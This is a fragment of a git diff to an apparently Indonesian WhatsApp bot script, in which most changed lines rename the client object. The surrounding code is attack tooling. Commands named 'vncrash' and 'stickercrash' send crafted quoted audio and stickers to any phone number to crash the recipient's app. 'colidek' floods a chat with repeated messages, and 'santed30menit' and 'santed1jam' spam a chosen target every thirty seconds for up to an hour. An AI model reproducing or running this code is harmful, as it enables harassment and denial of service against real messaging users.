-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                a = await dhaff.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+await dhaff.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
 m.reply(`SUCCES`)
                 await sleep(20)
             }
                 break
                 case 'colidek' : {
                     if (!isCreator) throw mess.owner
-                    a = await DhaffNetwork.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                    await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    a = await dhaff.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
+                    await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
                     m.reply(`BUG COLI DEK`)
                      }
                 break
@@ -10041,7 +10213,7 @@ case 'catalog': {
 
 if (!isCreator) throw mess.owner
 
-var messa = await prepareWAMessageMedia({ image: thumb }, { upload: DhaffNetwork.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: thumb }, { upload: dhaff.waUploadToServer })
 
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 
@@ -10081,7 +10253,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 
 }), { userJid: m.chat, quoted: m })
 
-DhaffNetwork.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+dhaff.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 
 }
 
@@ -10103,7 +10275,7 @@ adehvn = {
         } 
     }
  hey = fs.readFileSync('chan.mp3')
- DhaffNetwork.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
+ dhaff.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 break
 case 'bugsticker':
 if (!isCreator) throw mess.owner
@@ -10122,7 +10294,7 @@ adehvn = {
         } 
     }
  hey = fs.readFileSync('anjas.webp')
-DhaffNetwork.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
+dhaff.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
 break
 case 'vncrash':
 if (!isCreator) throw mess.owner
@@ -10142,7 +10314,7 @@ adehvn = {
         } 
     }
  hey = fs.readFileSync('chan.mp3')
- DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
+ dhaff.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
 break
 case 'stickercrash':
@@ -10163,12 +10335,12 @@ adehvn = {
         } 
     }
  hey = fs.readFileSync('anjas.webp')
-DhaffNetwork.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
+dhaff.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
 await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
 break
 case 'troli': {
 if (!isCreator) return
-var messa = await prepareWAMessageMedia({ image: thumb }, { upload: DhaffNetwork.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: thumb }, { upload: dhaff.waUploadToServer })
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  "orderMessage": {
 "orderId": "594071395007984",
@@ -10185,14 +10357,14 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "totalCurrencyCode": "IDR",
 }
 }), { userJid: m.chat, quoted: m })
-DhaffNetwork.relayMessage(m.chat, order.message, { messageId: order.key.id })
+dhaff.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 break
 case 'penjara':
 if (!isCreator) return
 if (!text) return m.reply(`*Contoh* :\n#penjara namagroup`)
-let cret = await DhaffNetwork.groupCreate(args.join(" "), [])
-let response = await DhaffNetwork.groupInviteCode(cret.id)
+let cret = await dhaff.groupCreate(args.join(" "), [])
+let response = await dhaff.groupInviteCode(cret.id)
 teks = `「 *Create Group* 」
 
 _▸ Name : ${cret.subject}_
@@ -10205,7 +10377,7 @@ break
 case 'santed30menit': 
 if (!isCreator) throw mess.owner
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-                a = await DhaffNetwork.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                a = await dhaff.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                 b = { 
         key: { 
             fromMe: false, 
@@ -10221,132 +10393,132 @@ if (!isCreator) throw mess.owner
         } 
     }
                 m.reply(`Target di santet selema 30 menit`)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
                 
    break
 case 'santed1jam': 
 if (!isCreator) throw mess.owner
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-                a = await DhaffNetwork.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+                a = await dhaff.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                 b = { 
         key: { 
             fromMe: false, 
@@ -10362,250 +10534,250 @@ if (!isCreator) throw mess.owner
         } 
     }
                 m.reply(`Target di santet selema 1 Jam`)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
